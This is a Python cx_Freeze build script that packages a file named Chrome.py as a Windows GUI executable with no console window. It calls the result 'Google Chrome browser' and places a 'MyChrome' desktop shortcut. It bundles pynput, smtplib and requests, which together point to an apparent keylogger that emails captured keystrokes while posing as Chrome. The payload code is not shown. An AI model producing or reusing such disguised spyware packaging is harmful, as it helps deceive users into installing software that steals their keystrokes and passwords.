from cx_Freeze import setup, Executable
import sys

base = None

if (sys.platform == "win32"):

    base = "Win32GUI"


executables = [Executable("Chrome.py", base=base, icon="icon.ico", shortcutName="MyChrome",
            shortcutDir="DesktopFolder",)]

packages = ["idna", "pynput", "threading", "smtplib", "time", "requests"]
options = {
    'build_exe': {
        'packages': packages,
    },
}

setup(
    name="Google Chrome browser",
    options=options,
    version="1.0",
    description='This is a web browser',
    executables=executables
)